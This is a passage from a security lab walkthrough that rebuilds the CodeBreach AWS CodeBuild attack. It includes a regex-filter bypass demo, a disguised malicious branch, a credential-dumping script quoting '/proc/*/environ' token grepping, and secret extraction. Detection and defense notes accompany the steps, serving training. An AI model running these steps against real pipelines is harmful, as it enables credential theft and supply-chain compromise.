      variable = "s3:x-amz-acl"
      values   = ["bucket-owner-full-control"]
    }
  }
}

resource "aws_s3_bucket_policy" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id
  policy = data.aws_iam_policy_document.cloudtrail_bucket_policy.json
}

resource "aws_cloudtrail" "lab" {
  name                          = "${var.project_prefix}-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail.id
  include_global_service_events = true
  is_multi_region_trail         = false
  enable_logging                = true

  depends_on = [aws_s3_bucket_policy.cloudtrail]
}
```

### outputs.tf

```hcl
# =============================================================================
# OUTPUTS
# =============================================================================
# These values are needed during the attack phase. Some are "public"
# information the attacker discovers, others are used for verification.
# =============================================================================

output "codebuild_project_name" {
  description = "Name of the CodeBuild project (the attacker discovers this)"
  value       = aws_codebuild_project.sdk_build.name
}

output "codebuild_project_arn" {
  description = "ARN of the CodeBuild project"
  value       = aws_codebuild_project.sdk_build.arn
}

output "vulnerable_filter_pattern" {
  description = "The VULNERABLE ACTOR_ACCOUNT_ID filter pattern (no anchors)"
  value       = local.vulnerable_actor_filter
}

output "secure_filter_pattern" {
  description = "What the filter SHOULD look like (with anchors)"
  value       = local.secure_actor_filter
}

output "artifacts_bucket" {
  description = "S3 bucket for build artifacts"
  value       = aws_s3_bucket.artifacts.bucket
}

output "github_automation_secret_arn" {
  description = "ARN of the GitHub automation PAT secret in Secrets Manager"
  value       = aws_secretsmanager_secret.github_automation.arn
}

output "npm_token_secret_arn" {
  description = "ARN of the npm token secret in Secrets Manager"
  value       = aws_secretsmanager_secret.npm_token.arn
}

output "database_secret_arn" {
  description = "ARN of the database credentials secret"
  value       = aws_secretsmanager_secret.database.arn
}

output "codebuild_role_arn" {
  description = "ARN of the CodeBuild IAM role"
  value       = aws_iam_role.codebuild.arn
}

output "lambda_function_name" {
  description = "Name of the simulated deployment Lambda function"
  value       = aws_lambda_function.deploy.function_name
}

output "cloudtrail_name" {
  description = "Name of the CloudTrail trail for forensics"
  value       = aws_cloudtrail.lab.name
}

output "github_repo_url" {
  description = "URL of the GitHub repository"
  value       = "https://github.com/${var.github_owner}/${var.github_repo}"
}

output "webhook_url" {
  description = "The webhook URL registered with GitHub (CodeBuild endpoint)"
  value       = aws_codebuild_webhook.sdk_webhook.url
  sensitive   = true
}

output "attack_summary" {
  description = "Summary of all resources and attack parameters"
  value = <<-EOT

  ========================================
  CODEBREACH LAB -- ATTACK PARAMETERS
  ========================================

  CodeBuild Project:  ${aws_codebuild_project.sdk_build.name}
  GitHub Repository:  https://github.com/${var.github_owner}/${var.github_repo}
  Artifacts Bucket:   ${aws_s3_bucket.artifacts.bucket}

  VULNERABLE FILTER:  ${local.vulnerable_actor_filter}
  SECURE FILTER:      ${local.secure_actor_filter}

  Secrets in Secrets Manager:
    - ${aws_secretsmanager_secret.github_automation.name} (ATTACK TARGET)
    - ${aws_secretsmanager_secret.npm_token.name}
    - ${aws_secretsmanager_secret.database.name}

  Lambda Function:    ${aws_lambda_function.deploy.function_name}
  CloudTrail:         ${aws_cloudtrail.lab.name}

  ========================================
  START THE ATTACK AT PART 3
  ========================================
  EOT
}
```

## Deployment Steps

### Step 1: Copy the Terraform files

Create the directory structure and copy all files above:

```bash
mkdir -p ~/codebreach-lab/terraform
cd ~/codebreach-lab/terraform

# Create each file (providers.tf, variables.tf, main.tf, outputs.tf)
# by copying the contents from the sections above.
```

### Step 2: Configure your variables
```bash
cp terraform.tfvars.example terraform.tfvars
nano terraform.tfvars
```

Replace each placeholder with the values from the GitHub Setup steps:

| Line in terraform.tfvars | Replace with |
|---|---|
| `github_token = "ghp_your_token_here"` | Your actual PAT from Step 1 |
| `github_owner = "your-github-username"` | Your GitHub username from Step 2 |
| `trusted_github_user_ids = ["12345678"]` | Your numeric GitHub user ID from Step 3 |

Save the file. Verify all placeholders are replaced:
```bash
grep "your" terraform.tfvars
```
This should return **no results**. If it does, you still have placeholders.
### Step 3: Initialize Terraform

```bash
terraform init
```

**What this does:**
- `terraform init` downloads the required provider plugins (aws ~> 6.30, random ~> 3.6, archive ~> 2.7) into `.terraform/`
- It initializes the local backend for storing state
- It validates the provider version constraints

**Expected output:**
```
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 6.30"...
- Installing hashicorp/aws v6.3x.x...
...
Terraform has been successfully initialized!
```

### Step 4: Review the execution plan

```bash
terraform plan
```

**What this does:**
- Reads all `.tf` files and compares desired state with actual state
- Shows exactly what resources will be created
- Does NOT make any changes to AWS

**Expected output:** Approximately 20-25 resources to create, including S3 buckets, IAM roles, Secrets Manager secrets, a CodeBuild project, a webhook, a Lambda function, and CloudTrail.

### Step 5: Deploy the infrastructure

```bash
terraform apply
```

When prompted, type `yes` to confirm.

**Expected output:** After 1-2 minutes:
```
Apply complete! Resources: ~23 added, 0 changed, 0 destroyed.

Outputs:

attack_summary = <<EOT
  ...
EOT
```

**IMPORTANT NOTE:** If the CodeBuild webhook creation fails with a GitHub authentication error, verify:
1. Your GitHub PAT has `repo` and `admin:repo_hook` scopes
2. The repository exists on GitHub and is accessible
3. The token has not expired

### Step 6: Note your attack parameters

```bash
# View the full attack summary
terraform output attack_summary

# Get the vulnerable filter pattern (you will analyze this during the attack)
terraform output vulnerable_filter_pattern
terraform output secure_filter_pattern
```

Save the project name and filter patterns. You will need them during the attack.

---

# PART 2: PRE-ATTACK VERIFICATION

Before starting the attack, verify the infrastructure is correctly deployed.

## Verify 1: CodeBuild Project Exists

```bash
# Get the CodeBuild project configuration
aws codebuild batch-get-projects \
  --names "$(terraform output -raw codebuild_project_name)" \
  --query 'projects[0].{Name:name,Source:source.location,Role:serviceRole}' \
  --output table
```

**Expected output:** A table showing the project name, GitHub source URL, and IAM role ARN.

## Verify 2: Webhook Is Configured

```bash
# List webhooks for the project
aws codebuild batch-get-projects \
  --names "$(terraform output -raw codebuild_project_name)" \
  --query 'projects[0].webhook.filterGroups'
```

**Expected output:** JSON showing the filter groups, including the `ACTOR_ACCOUNT_ID` filter with the unanchored pattern.

## Verify 3: Secrets Exist in Secrets Manager

```bash
# List all lab secrets
aws secretsmanager list-secrets \
  --filters "Key=name,Values=codebreach-lab" \
  --query 'SecretList[].{Name:Name,Description:Description}' \
  --output table
```

**Expected output:** Three secrets: `codebreach-lab/github-automation`, `codebreach-lab/npm-publish-token`, and `codebreach-lab/database-credentials`.

## Verify 4: Lambda Function Exists

```bash
aws lambda get-function \
  --function-name "$(terraform output -raw lambda_function_name)" \
  --query 'Configuration.{Name:FunctionName,Runtime:Runtime,Role:Role}' \
  --output table
```

**Expected output:** The deployment Lambda function with `python3.12` runtime.

## Verify 5: GitHub Repository is Accessible

```bash
# Verify the repo exists and is accessible
curl -s "https://api.github.com/repos/$(terraform output -raw github_repo_url | sed 's|https://github.com/||')" | jq '{name: .name, visibility: .visibility, default_branch: .default_branch}'
```

**Expected output:**
```json
{
  "name": "mega-sdk-js",
  "visibility": "public",
  "default_branch": "main"
}
```

---

# PART 3: ATTACK EXECUTION

From this point forward, you are the attacker. You are a security researcher who has discovered that a major SDK vendor uses AWS CodeBuild with public project visibility.

---

## STEP 1: Reconnaissance -- Discover the CodeBuild Project Configuration

### Context (Attacker Mindset)

You are hunting for CI/CD misconfigurations in open-source projects. You know that AWS CodeBuild projects can be set to "public" visibility, which exposes their configuration -- including webhook filter patterns -- through the AWS API and the CodeBuild public dashboard. You target organizations that maintain popular npm packages because compromising their build pipeline would give you supply chain access to thousands of downstream users.

### Concept: AWS CodeBuild Public Projects

**AWS CodeBuild** is a fully managed CI/CD build service. A CodeBuild "project" defines: where to get source code (GitHub, CodeCommit, S3, etc.), how to build it (buildspec.yml), what IAM role to use, and where to put artifacts.

Projects can have two visibility levels:
- **Private** (default): Only the AWS account owner can see project details
- **Public**: Anyone can view the project's build logs and configuration via the CodeBuild public builds dashboard

When a project is public, its webhook filter patterns become readable. This is how the real CodeBreach attackers discovered the unanchored regex patterns on AWS's own repositories.

### Commands

```bash
# In a real attack, you would discover the project through the CodeBuild
# public builds dashboard or by scanning AWS APIs.
# For the lab, we know the project name from Terraform output.

PROJECT_NAME="$(cd ~/codebreach-lab/terraform && terraform output -raw codebuild_project_name)"

# Retrieve the full project configuration
# In a real attack with public visibility, this information is available
# without authentication. For the lab, we use admin credentials.
aws codebuild batch-get-projects --names "${PROJECT_NAME}" > /tmp/codebuild_project.json

# Display the key security-relevant fields
echo "=== PROJECT CONFIGURATION ==="
cat /tmp/codebuild_project.json | jq '.projects[0] | {
  name: .name,
  source_type: .source.type,
  source_location: .source.location,
  buildspec: .source.buildspec,
  service_role: .serviceRole,
  environment_type: .environment.type,
  environment_image: .environment.image
}'

echo ""
echo "=== WEBHOOK FILTERS (THIS IS WHAT WE ARE LOOKING FOR) ==="
cat /tmp/codebuild_project.json | jq '.projects[0].webhook.filterGroups'

echo ""
echo "=== ENVIRONMENT VARIABLES (shows what secrets are in the build) ==="
cat /tmp/codebuild_project.json | jq '.projects[0].environment.environmentVariables[] | {name: .name, type: .type}'
```

**Flag breakdown:**
- `batch-get-projects` -- Retrieves detailed configuration for one or more CodeBuild projects
- `--names` -- Space-separated list of project names to retrieve
- `> /tmp/codebuild_project.json` -- Redirect output to a file for repeated parsing
- `jq '.projects[0]...'` -- Extract specific fields from the JSON response

**Expected output:**
```json
{
  "name": "codebreach-lab-sdk-build",
  "source_type": "GITHUB",
  "source_location": "https://github.com/YOUR_USER/mega-sdk-js.git",
  "buildspec": "buildspec.yml",
  "service_role": "arn:aws:iam::XXXXXXXXXXXX:role/codebreach-lab-codebuild-role",
  "environment_type": "LINUX_CONTAINER",
  "environment_image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0"
}

[
  [
    { "type": "EVENT", "pattern": "PULL_REQUEST_CREATED, PULL_REQUEST_UPDATED" },
    { "type": "ACTOR_ACCOUNT_ID", "pattern": "12345678" }
  ]
]

{ "name": "SDK_NAME", "type": "PLAINTEXT" }
{ "name": "GITHUB_TOKEN", "type": "SECRETS_MANAGER" }
{ "name": "NPM_TOKEN", "type": "SECRETS_MANAGER" }
```

### What Just Happened

You retrieved the complete CodeBuild project configuration. From this, you learned:

1. **Source**: The project builds from GitHub repository `mega-sdk-js`
2. **Webhook filters**: Builds trigger on `PULL_REQUEST_CREATED` and `PULL_REQUEST_UPDATED` events, but ONLY from actors whose GitHub user ID matches the `ACTOR_ACCOUNT_ID` pattern
3. **Build secrets**: The environment contains `GITHUB_TOKEN` and `NPM_TOKEN` from Secrets Manager -- these are high-value targets
4. **IAM role**: The CodeBuild role ARN reveals the AWS account ID

The critical finding is the `ACTOR_ACCOUNT_ID` pattern. Note it carefully -- you will analyze it in the next step.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application | **T1190** | Initial Access |

The CodeBuild public project configuration is the "public-facing application" being exploited. The attacker accesses it to discover the webhook filter vulnerability.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CSPM** | CodeBuild project has public visibility enabled | **High** |
| **CSPM** | CodeBuild project uses PAT-based GitHub authentication instead of CodeConnections | **Medium** |
| **CDR** | BatchGetProjects API call from external IP / unknown principal | **Low** |

A CNAPP scanning CodeBuild configurations would flag public project visibility as a posture violation. Prisma Cloud's CSPM module checks for this under its CI/CD security policies.

### Defense

1. **Never set CodeBuild projects to public visibility** unless absolutely required for open-source transparency
2. **Use AWS CodeConnections** (GitHub App) instead of PATs for GitHub integration
3. **Monitor `BatchGetProjects`** API calls in CloudTrail for unauthorized reconnaissance
4. **Apply IAM conditions** to restrict who can read CodeBuild project configurations

### Real-World Examples

- **CodeBreach (Wiz, Jan 2026)**: Wiz discovered four AWS-managed public CodeBuild projects with exposed webhook configurations, including the aws-sdk-js-v3 build pipeline
- **tj-actions/changed-files (March 2025)**: A compromised bot PAT allowed attackers to rewrite GitHub Action tags, affecting 23,000 repositories

---

## STEP 2: Analyze the Webhook Filter -- Identify the Regex Flaw

### Context (Attacker Mindset)

You have the `ACTOR_ACCOUNT_ID` filter pattern. Now you need to understand how CodeBuild evaluates it. CodeBuild webhook filters use **Java-style regular expressions** for pattern matching. The critical question is: does this pattern enforce an *exact match* or does it allow *substring matching*?

### Concept: Regular Expressions as Access Control

Regular expressions (regex) are patterns that describe sets of strings. In the context of webhook filters, the regex pattern defines which GitHub user IDs are allowed to trigger builds.

**Anchors** are special regex characters:
- `^` -- matches the beginning of the string
- `$` -- matches the end of the string

Without anchors, the regex engine searches for the pattern *anywhere within* the string:

```
Pattern: 755743
Input:   755743      -> MATCH (exact -- intended)
Input:   226755743   -> MATCH (substring -- NOT intended!)
Input:   755743999   -> MATCH (substring -- NOT intended!)
Input:   999755743   -> MATCH (substring -- NOT intended!)
```

With proper anchors:

```
Pattern: ^(755743)$
Input:   755743      -> MATCH (exact -- intended)
Input:   226755743   -> NO MATCH (^ requires start of string)
Input:   755743999   -> NO MATCH ($ requires end of string)
```

The pipe character `|` means "OR" in regex. So `755743|234567` means "match 755743 OR 234567." Without anchors, both alternatives allow substring matching.

### Commands

```bash
# Retrieve the vulnerable pattern
VULNERABLE_PATTERN=$(cd ~/codebreach-lab/terraform && terraform output -raw vulnerable_filter_pattern)
SECURE_PATTERN=$(cd ~/codebreach-lab/terraform && terraform output -raw secure_filter_pattern)
TRUSTED_ID=$(echo "${VULNERABLE_PATTERN}" | cut -d'|' -f1)

echo "=== VULNERABLE PATTERN ==="
echo "${VULNERABLE_PATTERN}"
echo ""
echo "=== SECURE PATTERN ==="
echo "${SECURE_PATTERN}"
echo ""

# Now let us demonstrate the flaw using Python regex
# This simulates how CodeBuild evaluates the ACTOR_ACCOUNT_ID filter:


python3 << PYEOF
import re

# Get the trusted user ID from the vulnerable pattern
# In the real attack, this was 755743 (a 6-digit AWS maintainer ID)
vulnerable_pattern = "${VULNERABLE_PATTERN}"

# Extract the first user ID from the pattern
trusted_id = vulnerable_pattern.split("|")[0]
print(f"\nTrusted maintainer ID: {trusted_id}")
print(f"Vulnerable pattern: {vulnerable_pattern}")
print(f"Secure pattern: ^({vulnerable_pattern})\$")

# Simulate the eclipse: generate a 9-digit ID containing the trusted ID
eclipse_id = "226" + trusted_id # Prepend digits to create a superstring
print(f"\nAttacker's manufactured ID: {eclipse_id}")
print(f"(Contains '{trusted_id}' as a substring)")

# Test the vulnerable pattern (no anchors)
vulnerable_regex = re.compile(vulnerable_pattern)
match_vuln = vulnerable_regex.search(eclipse_id)
print(f"\nVULNERABLE pattern match on '{eclipse_id}': {'MATCH (BUILD TRIGGERS!)' if match_vuln else 'NO MATCH'}")
if match_vuln:
    print(f"  Matched substring: '{match_vuln.group()}' at position {match_vuln.start()}-{match_vuln.end()}")

# Test the secure pattern (with anchors)
secure_regex = re.compile(f"^({vulnerable_pattern})\$")
match_sec = secure_regex.search(eclipse_id)
print(f"SECURE pattern match on '{eclipse_id}':     {'MATCH' if match_sec else 'NO MATCH (BUILD BLOCKED!)'}")

# Also test that the real trusted ID still passes both
print(f"\nVULNERABLE pattern match on '{trusted_id}': {'MATCH' if vulnerable_regex.search(trusted_id) else 'NO MATCH'}")
print(f"SECURE pattern match on '{trusted_id}':     {'MATCH' if secure_regex.search(trusted_id) else 'NO MATCH'}")
PYEOF
```



**Expected output:**
```
Trusted maintainer ID: 12345678
Vulnerable pattern: 12345678
Secure pattern: ^(12345678)$

Attacker's manufactured ID: 22612345678
(Contains '12345678' as a substring)

VULNERABLE pattern match on '22612345678': MATCH (BUILD TRIGGERS!)
  Matched substring: '12345678' at position 3-11
SECURE pattern match on '22612345678':     NO MATCH (BUILD BLOCKED!)

VULNERABLE pattern match on '12345678': MATCH
SECURE pattern match on '12345678':     MATCH
```

### What Just Happened

You proved that the unanchored regex pattern allows any GitHub user ID that *contains* a trusted ID as a substring to pass the filter. The Python script simulates exactly what CodeBuild's Java regex engine does when evaluating webhook payloads.

The key insight: **Two missing characters (`^` and `$`) turn an exact-match allowlist into a substring-match filter that can be bypassed by anyone willing to manufacture a matching GitHub user ID.**

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Supply Chain Compromise: Compromise Software Supply Chain | **T1195.002** | Initial Access |

This is the reconnaissance phase of the supply chain attack -- understanding the filter flaw that enables the bypass.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CSPM** | CodeBuild webhook ACTOR_ACCOUNT_ID filter lacks regex anchors | **Critical** |
| **ASPM** | CI/CD pipeline has insufficient actor validation | **High** |

A sophisticated CSPM with CI/CD awareness would scan CodeBuild webhook filter patterns for missing anchors. Wiz specifically added a detection query for this pattern after the CodeBreach disclosure.

### Defense

1. **Always anchor regex patterns** with `^` and `$` when used as access control
2. **Use the PR Comment Approval build gate** -- AWS introduced this specifically after CodeBreach. It requires a trusted maintainer to comment on a PR before the build triggers
3. **Use CodeConnections** with GitHub App-based authentication, which provides more granular control than webhook filters
4. **Audit webhook filters** regularly using infrastructure-as-code scanning tools

---

## STEP 3: GitHub ID Eclipse -- Understand Sequential ID Assignment

### Context (Attacker Mindset)

You know the filter is vulnerable to substring matching. Now you need a GitHub account whose numeric user ID contains the trusted maintainer's ID as a substring. GitHub assigns IDs sequentially, so you can *predict* when a matching ID will become available and race to claim it.

### Concept: GitHub Sequential User IDs

GitHub assigns numeric user IDs from a single auto-incrementing counter shared by all users, organizations, and GitHub Apps. The first GitHub user (Tom Preston-Werner, `mojombo`) has ID 1. Accounts created in 2025-2026 have IDs in the 200-million range.

Key facts:
- IDs are assigned **sequentially** (never randomly, never recycled)
- Both users and organizations draw from the **same counter**
- GitHub creates approximately **200,000 new IDs per day**
- IDs are **immutable** -- usernames can change, but IDs never do

This means that for any short trusted ID (like 6-digit `755743`), a 9-digit ID containing it as a substring will eventually be assigned. With 200,000 new IDs per day, a matching 9-digit ID appears roughly **every 5 days**.

### Commands

```bash
# Demonstrate GitHub's sequential ID assignment
echo "=== GitHub User ID Reconnaissance ==="
echo ""

# Check your own GitHub user ID
echo "Your GitHub user ID:"
curl -s "https://api.github.com/users/${GITHUB_USERNAME}" | jq '{login: .login, id: .id, created_at: .created_at}'

echo ""
echo "=== Sampling the Current ID Counter ==="

# In the real attack, Wiz used the organization creation API to sample
# the current counter position. Creating an org uses a sequential ID,
# and they could immediately delete it.
# We will just query the GitHub API to see recent user IDs.

# Look at a very recently created user (the latest GitHub user)
# This approximates where the counter is right now
echo "Recent GitHub user IDs (approximation):"
curl -s "https://api.github.com/users?since=200000000&per_page=3" | jq '.[].id'

echo ""
echo "=== Eclipse Calculation ==="

# Calculate when a matching ID will appear
python3 << PYEOF

# Get the trusted ID from the lab
trusted_id = "${TRUSTED_ID}"

# Approximate current counter position
current_counter = 250000000  # Approximate as of March 2026

# Find the next 9-digit ID that contains the trusted ID as a substring
# In practice, we prepend digits to the trusted ID
candidates = []
for prefix_len in range(1, 4):
    for prefix in range(10**(prefix_len-1), 10**prefix_len):
        candidate = int(str(prefix) + trusted_id)
        if candidate > current_counter:
            candidates.append(candidate)

# Also try appending digits
for suffix_len in range(1, 4):
    for suffix in range(10**(suffix_len-1), 10**suffix_len):
        candidate = int(trusted_id + str(suffix))
        if candidate > current_counter:
            candidates.append(candidate)

# Sort and show the nearest ones
candidates.sort()
nearest = candidates[:5] if candidates else []

print(f"\nTrusted ID: {trusted_id}")
print(f"Approximate current counter: {current_counter:,}")
print(f"\nNearest future IDs containing '{trusted_id}' as substring:")
for c in nearest:
    ids_away = c - current_counter
    days_away = ids_away / 200000  # ~200k new IDs per day
    print(f"  ID {c:,}  ({ids_away:,} IDs away, ~{days_away:.1f} days)")

if nearest:
    print(f"\nIn the real attack, Wiz would wait for the counter to approach")
    print(f"the target ID, then batch-create 200 GitHub App registrations")
    print(f"to capture the exact ID. The App manifest flow is atomic --")
    print(f"the bot user only materializes when you visit the confirmation URL.")
PYEOF
```

### What Just Happened

You explored GitHub's sequential ID assignment system and calculated when a matching ID would appear. In the real CodeBreach attack:

1. Wiz sampled the counter by creating/deleting GitHub organizations
2. They identified that ID `226755743` would soon be available (containing trusted ID `755743`)
3. They prepared 200 GitHub App manifest registration requests
4. When the counter approached the target, they visited all 200 confirmation URLs simultaneously
5. One of the apps received ID `226755743` -- **the exact ID needed to bypass the filter**

For the lab, we skip the actual ID manufacturing (it would require hundreds of GitHub API calls and precise timing). Instead, we simulate the bypass by triggering the build directly.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Supply Chain Compromise: Compromise Software Supply Chain | **T1195.002** | Initial Access |

Manufacturing a GitHub identity to bypass CI/CD controls is the operational execution phase of the supply chain attack.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | New GitHub identity triggers build for the first time | **High** |
| **ASPM** | Build triggered by unknown / first-seen GitHub user | **High** |

CDR systems that baseline which GitHub users normally trigger builds would flag a first-time actor as anomalous, even if the webhook filter passes.

### Defense

1. **Do not rely solely on ACTOR_ACCOUNT_ID filters** -- they are regex-based and error-prone
2. **Enable PR Comment Approval** -- requires a human maintainer to approve each build
3. **Maintain an explicit allowlist** of GitHub user IDs with exact matching
4. **Monitor for first-seen actors** triggering builds and alert the team

---

## STEP 4: Trigger an Unauthorized Build

### Context (Attacker Mindset)

In the real attack, the attacker would submit a PR from the manufactured GitHub identity. For the lab, we will trigger a build manually to demonstrate what happens inside the build environment. We will create a branch with a modified buildspec that exposes the build environment -- simulating the attacker's malicious PR.

### Concept: CodeBuild Buildspec and Build Triggers

A **buildspec** (`buildspec.yml`) is a YAML file that tells CodeBuild what commands to run during each build phase: `install`, `pre_build`, `build`, `post_build`. The buildspec can also define environment variables, including references to Secrets Manager secrets.

When a webhook-triggered build starts:
1. GitHub sends a webhook event to the CodeBuild endpoint
2. CodeBuild evaluates the webhook filters (EVENT, ACTOR_ACCOUNT_ID, etc.)
3. If all filters pass, CodeBuild starts a build
4. CodeBuild clones the source code (from the PR branch)
5. CodeBuild resolves Secrets Manager references, injecting them as environment variables
6. The buildspec commands execute in a Docker container with those environment variables

The attacker's strategy: modify the buildspec (or add a malicious dependency) so that the build commands exfiltrate the environment variables, which now contain the resolved secrets.

### Commands

```bash
# Navigate to the local repo
cd /tmp/mega-sdk-js

# Create a branch simulating the attacker's malicious PR
git checkout -b attacker/innocent-bugfix

# Create a script that demonstrates credential exposure
# In the real attack, this was embedded as an npm dependency's preinstall script
# that performed a process memory dump using /proc/*/environ
cat > credential_exposure_demo.sh << 'BASH'
#!/bin/bash
# =============================================================================
# CREDENTIAL EXPOSURE DEMONSTRATION
# =============================================================================
# This script shows what an attacker can access from inside a CodeBuild
# build environment. In the real CodeBreach attack, the attacker embedded
# this as an npm package dependency that ran during "npm install".
#
# The attacker's actual technique was to dump /proc/*/environ to find
# the GitHub PAT in process memory. We simulate this more simply by
# reading environment variables directly.
# =============================================================================

echo "============================================"
echo "  BUILD ENVIRONMENT CREDENTIAL EXPOSURE"
echo "============================================"
echo ""

# 1. Show all environment variables (many contain secrets)
echo "--- Environment Variables ---"
echo "CODEBUILD_BUILD_ID: ${CODEBUILD_BUILD_ID}"
echo "CODEBUILD_SOURCE_REPO_URL: ${CODEBUILD_SOURCE_REPO_URL}"
echo "CODEBUILD_WEBHOOK_ACTOR_ACCOUNT_ID: ${CODEBUILD_WEBHOOK_ACTOR_ACCOUNT_ID}"
echo "CODEBUILD_WEBHOOK_EVENT: ${CODEBUILD_WEBHOOK_EVENT}"
echo ""

# 2. Check for GitHub token in environment
echo "--- Secret Detection ---"
if [ -n "${GITHUB_TOKEN}" ]; then
    # Show just the first 10 characters to prove we have it
    echo "GITHUB_TOKEN present: ${GITHUB_TOKEN:0:10}... (REDACTED)"
    echo "TOKEN LENGTH: ${#GITHUB_TOKEN} characters"
else
    echo "GITHUB_TOKEN: not set in environment"
fi

if [ -n "${NPM_TOKEN}" ]; then
    echo "NPM_TOKEN present: ${NPM_TOKEN:0:10}... (REDACTED)"
else
    echo "NPM_TOKEN: not set in environment"
fi
echo ""

# 3. Check process memory for credentials (the real attack technique)
echo "--- Process Memory Scan (simulated) ---"
echo "In the real CodeBreach attack, the attacker ran:"
echo "  cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i token"
echo ""
echo "This dumps all environment variables from ALL running processes,"
echo "including the CodeBuild agent process that holds the GitHub PAT."
echo ""

# 4. Show the CodeBuild role credentials (always present)
echo "--- AWS Credentials (from instance metadata) ---"
echo "AWS_DEFAULT_REGION: ${AWS_DEFAULT_REGION}"
echo "AWS_REGION: ${AWS_REGION}"
# The role credentials are available but we do not print the secrets
echo "AWS_ACCESS_KEY_ID: present (CodeBuild service role)"
echo "AWS_SECRET_ACCESS_KEY: present (CodeBuild service role)"
echo "AWS_SESSION_TOKEN: present (temporary STS token)"
echo ""

echo "============================================"
echo "  DEMONSTRATION COMPLETE"
echo "============================================"
echo "In a real attack, these credentials would be"
echo "exfiltrated to an attacker-controlled server."
echo "============================================"
BASH

chmod +x credential_exposure_demo.sh

# Commit the file
git add credential_exposure_demo.sh
git commit -m "fix: handle edge case in SDK initialization"
git push -u origin attacker/innocent-bugfix
```

Now trigger a build manually (simulating the webhook-triggered build):

```bash
# Start a CodeBuild build manually using the attacker branch
# In the real attack, this would be triggered automatically by the webhook
# when the PR is submitted from the manufactured GitHub identity
PROJECT_NAME=$(cd ~/codebreach-lab/terraform && terraform output -raw codebuild_project_name)

aws codebuild start-build \
  --project-name "${PROJECT_NAME}" \
  --source-version "attacker/innocent-bugfix" \
  --buildspec-override "version: 0.2
phases:
  build:
    commands:
      - echo 'Build started'
      - bash credential_exposure_demo.sh
      - echo 'Build complete'
" \
  --query 'build.{Id:id,Status:buildStatus,StartTime:startTime}' \
  --output table

# Save the build ID for log retrieval
BUILD_ID=$(aws codebuild list-builds-for-project \
  --project-name "${PROJECT_NAME}" \
  --query 'ids[0]' \
  --output text)

echo ""
echo "Build ID: ${BUILD_ID}"
echo "Waiting for build to complete..."
```

**Flag breakdown:**
- `start-build` -- Manually start a CodeBuild build
- `--project-name` -- The CodeBuild project to build
- `--source-version` -- The Git branch to build from (our attacker branch)
- `--buildspec-override` -- Override the repo's buildspec with our own commands. This simulates the attacker adding malicious build steps via a modified buildspec in their PR
- `--query` -- JMESPath query to extract specific fields from the response

**Wait for the build to complete** (usually 1-2 minutes):

```bash
# Poll for build completion
while true; do
  STATUS=$(aws codebuild batch-get-builds --ids "${BUILD_ID}" --query 'builds[0].buildStatus' --output text)
  echo "Build status: ${STATUS}"
  if [ "${STATUS}" != "IN_PROGRESS" ]; then
    break
  fi
  sleep 10
done

# Retrieve the build logs
echo ""
echo "=== BUILD LOGS ==="
LOG_GROUP="/aws/codebuild/${PROJECT_NAME}"
LOG_STREAM=$(aws codebuild batch-get-builds --ids "${BUILD_ID}" --query 'builds[0].logs.streamName' --output text)

aws logs get-log-events \
  --log-group-name "${LOG_GROUP}" \
  --log-stream-name "${LOG_STREAM}" \
  --query 'events[].message' \
  --output text
```

### What Just Happened

You triggered a CodeBuild build that executed inside the build container. The `credential_exposure_demo.sh` script demonstrated that:

1. **Secrets Manager values are resolved into environment variables** -- `GITHUB_TOKEN` and `NPM_TOKEN` are directly accessible to any code running in the build
2. **AWS role credentials are available** -- the CodeBuild service role's temporary credentials are injected as `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`
3. **Process memory contains all credentials** -- the `/proc/*/environ` technique reads environment variables from all processes, including the CodeBuild agent

In the real CodeBreach attack, the attacker's malicious npm dependency performed a memory dump during `npm install` (which runs as part of the `install` phase), before any actual build commands execute. AWS had implemented memory protections after a prior incident, but one process was overlooked.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Trusted Relationship | **T1199** | Initial Access |
| Command and Scripting Interpreter: Unix Shell | **T1059.004** | Execution |

T1199 applies because the attacker is exploiting the trusted relationship between GitHub and CodeBuild -- the webhook mechanism is designed to automatically execute code from trusted contributors.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | CodeBuild build triggered with buildspec override | **Critical** |
| **CDR** | Build triggered by unknown/first-seen Git branch | **High** |
| **CWP** | Anomalous process execution in build container (credential dumping) | **Critical** |
| **ASPM** | Buildspec modified outside normal PR review workflow | **Critical** |

### Defense

1. **Enable PR Comment Approval** -- requires maintainer approval before builds trigger
2. **Restrict `--buildspec-override`** -- disable buildspec overrides in the project configuration so attackers cannot inject their own build commands
3. **Use code signing** -- ensure only signed buildspec changes are accepted
4. **Monitor for buildspec overrides** in CloudTrail (`StartBuild` events with `buildspecOverride` parameter)

---

## STEP 5: Credential Theft -- Extract Secrets from the Build Environment

### Context (Attacker Mindset)

The build logs from Step 4 showed that credentials are accessible in the build environment. Now you will use the CodeBuild service role's AWS credentials to directly access Secrets Manager and extract the GitHub PAT and other secrets. This simulates what the attacker's malicious code does during the build.

### Concept: CodeBuild Service Role Credentials

Every CodeBuild build runs with temporary AWS credentials derived from the project's **service role**. These credentials are available as environment variables:
- `AWS_ACCESS_KEY_ID` -- the temporary access key
- `AWS_SECRET_ACCESS_KEY` -- the temporary secret key
- `AWS_SESSION_TOKEN` -- the STS session token (required for temporary credentials)

These are the same credentials that resolve Secrets Manager references in the buildspec. If the service role has broad Secrets Manager permissions, the build code can access *any* secret within scope -- not just the ones explicitly listed in the buildspec.

### Commands

```bash
# Simulate accessing secrets from within the build environment.
# In the real attack, this code runs INSIDE the CodeBuild container.
# For the lab, we use admin credentials to demonstrate what the
# CodeBuild role can access.

echo "=== EXTRACTING SECRETS (simulating build environment access) ==="
echo ""

# The GitHub PAT -- the crown jewel
echo "--- GitHub Automation Bot Token ---"
aws secretsmanager get-secret-value \
  --secret-id "codebreach-lab/github-automation" \
  --query 'SecretString' \
